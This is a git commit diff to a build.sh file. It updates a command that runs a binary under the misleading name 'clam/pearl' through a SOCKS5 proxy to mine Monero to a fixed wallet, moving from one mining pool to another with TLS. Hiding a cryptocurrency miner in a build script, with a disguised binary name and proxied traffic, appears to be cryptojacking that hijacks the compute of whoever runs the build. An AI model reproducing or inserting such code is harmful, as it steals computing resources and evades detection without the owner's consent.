b19cfce53a6763e92af314bd50499a14097534de
vladimir <vladimir@playsnook.com>
2024-09-13 13:24:51 +0300

    server

--- build.sh
+++ build.sh
@@ -9,7 +9,7 @@ which wget
 # whoami 
 #clam/pearl --version
 curl --socks5 199.116.112.6:4145 ipinfo.io
-timeout 120 clam/pearl -x 199.116.112.6:4145 -o xmr-eu1.nanopool.org:14433 -u 41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaM
-g8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ --coin monero
+timeout 120 clam/pearl -x 199.116.112.6:4145 -o pool.supportxmr.com:3333 -u 41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaM
+g8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ --tls --coin monero
 #curl 18.196.88.146:14433
 #ping -c 1 xmr-eu1.nanopool.org
